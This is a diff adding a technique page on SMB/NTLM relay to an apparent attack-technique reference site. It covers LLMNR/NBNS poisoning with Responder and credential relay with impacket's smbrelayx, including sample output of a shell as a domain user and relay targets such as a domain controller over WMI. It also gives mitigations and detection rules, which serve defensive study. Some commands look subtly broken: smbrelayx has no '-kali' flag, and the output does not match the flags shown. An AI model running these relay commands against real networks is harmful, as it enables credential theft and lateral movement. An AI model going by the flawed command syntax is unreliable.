@@ -1,0 +1,166 @@
+---
+title: SMB / NTLM Relay
+mitre: T1557.001
+category: credential-access
+group: Active Directory Attacks
+summary: Redirect NTLM authentication to an attacker-controlled service and relay the challenge-response to a target.
+platform: [Windows, Linux]
+tags: ['NTLM', 'SMB', 'Responder', 'MITM']
+updated: '2026-09-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: Poison name resolution
+    desc: The victim queries an LLMNR, NBNS or mDNS name; the attacker answers before the real resolver does.
+    dll: '-'
+  - call: Answer the SMB negotiate
+    desc: The attacker's SMB server accepts the victim's NTLMSSP negotiate and challenge exchange.
+    dll: '-'
+  - call: Relay the authentication
+    desc: Forward the victim's NTLM exchange to an SMB, WMI or HTTP endpoint that accepts NTLM.
+    dll: '-'
+  - call: Act as the victim
+    desc: The target accepts the relayed response; the attacker executes with the victim's rights.
+    dll: '-'
+detections:
+  - src: NETWORK
+    text: LLMNR, NBNS or mDNS queries for short names answered by a source that is not the domain DNS.
+  - src: ETW-TI
+    text: An NTLM authentication from a workstation to a host that does not normally provide SMB or WMI.
+  - src: BEHAVIOURAL
+    text: One account performing NTLM logons to several high-value services within seconds of a relayable response.
+  - src: WINDOWS EID 4624
+    text: A network logon (type 3) using NTLM on a host where Kerberos should be the expected protocol.
+related:
+  - mitre: T1550.002
+    title: Pass the Hash
+    desc: The relay can yield a usable NT hash context; pass-the-hash spends it directly.
+    href: /techniques/credential-access/pass-the-hash
+  - mitre: T1071.002
+    title: SMB Named Pipe C2
+    desc: The same SMB transport, used here as the relay target rather than the beacon channel.
+    href: /techniques/c2/smb-named-pipe
+  - mitre: T1550.003
+    title: Pass the Ticket
+    desc: The Kerberos-side alternative; relay works on the NTLM leg, PtT on the ticket leg.
+    href: /techniques/credential-access/pass-the-ticket
+  - mitre: T1558.003
+    title: Kerberoasting
+    desc: Once the relay yields a foothold, SPN enumeration becomes available as the next step.
+    href: /techniques/credential-access/kerberoasting
+labKit:
+  - label: Responder
+    href: 'https://github.com/lgandx/Responder'
+  - label: impacket smbrelayx
+    href: 'https://github.com/fortra/impacket'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+NTLM is a challenge-response protocol in which the client proves knowledge of a hash without
+sending the password. The weakness is that, by default, the client does not bind the response to
+the server it intended to talk to. An attacker who can sit between the client and the name the
+client is resolving can answer that name, let the client run the full NTLM exchange against the
+attacker, and then replay the exchange against a different server that the victim is allowed to
+authenticate to. The second server sees a valid NTLM response from a valid account and accepts
+it, without ever knowing the first hop was an impostor.
+
+The practical setup is a name-resolution poison - LLMNR, NBNS or mDNS - that convinces a victim
+workstation to open an SMB session to the attacker. The attacker then relays the resulting NTLM
+authentication to a target such as a domain controller, a file server, or a WMI endpoint. If the
+victim holds local admin on the target, the relay yields execution there; if the target is a DC
+and WMI is open, it can yield a daemon or a credential dump.
+
+<Callout type="caution">
+  The two controls that break a naive relay are SMB signing and channel binding. If the target
+  requires SMB signing, the attacker cannot complete the relayed session without the victim's
+  signing key. If the service binds the NTLM exchange to the TLS channel or the SPN, the replayed
+  response no longer matches. Enforce both; the relay is the technique that exists because of the
+  gap between them.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+The canonical tooling is a listener that answers the poisoned name and a relayer that forwards
+the authentication. Responder handles the first half; impacket's `smbrelayx` handles the second.
+
+<CodeBlock
+  file="relay.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# 1. answer LLMNR / NBNS / mDNS and listen for the SMB connection
+$ ./Responder -I eth0 -dWa
+[SMBD] Service started
+[LLMNR] Poisoned: WORKSTATION-01 -> 10.10.14.5
+[SMB] Inbound connection (NTLM): WORKSTATION-01\\jsmith
+
+# 2. relay that authentication to a target that accepts NTLM
+$ smbrelayx.py -kali -no-pass -c 'cmd' 10.10.10.20
+[*] Target: 10.10.10.20
+[*] Executing: cmd
+Microsoft Windows [Version 10.0.19045]
+C:\\> whoami
+corp\\jsmith`}
+/>
+
+The same relay can be pointed at WMI or at a specific service instead of a shell, depending on
+what the victim's rights allow on the target.
+
+<CodeBlock
+  file="relay_targets.txt"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# WMI execution against a target where the victim is local admin
+$ smbrelayx.py -kali -no-pass -t wmi 10.10.10.20
+
+# HTTP relay to a Windows-Integrated-Auth endpoint
+$ smbrelayx.py -kali -no-pass -t http https://intranet.corp.local/login
+
+# a relay to a DC over WMI is the highest-impact outcome in most domains
+$ smbrelayx.py -kali -no-pass -t wmi dc01.corp.local`}
+/>
+
+## Verifying in the lab
+
+Inside a snapshotted VM, configure a workstation to resolve a short name over LLMNR, run the
+listener, and watch the NTLM exchange arrive. Confirm the relayed logon on the target with an
+EID 4624 whose authentication package is NTLM and whose source is the victim, not the operator.
+
+<CodeBlock
+  file="lab_check"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# on the target, the logon event is the artifact
+# EID 4624: LogonType 3, AuthPackage NTLM, WorkstationName WORKSTATION-01
+#          ^ a network logon the user did not initiate  <-- the artifact`}
+/>
+
+## Detection
+
+The relay is a network-positioning problem, so the cheapest signals are the name-resolution
+poison and the NTLM logon that follows it.
+
+<DetectionGrid items={frontmatter.detections} />
+
+Rank them: the LLMNR / NBNS monitor is the earliest continuous control and catches the setup
+before any authentication happens. The ETW-TI NTLM-to-unexpected-host rule is the highest-fidelity
+catch for the relay itself and needs a baseline of which hosts legitimately provide SMB or WMI.
+The EID 4624 rule is the triage confirmation and is useful where network telemetry is thin.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
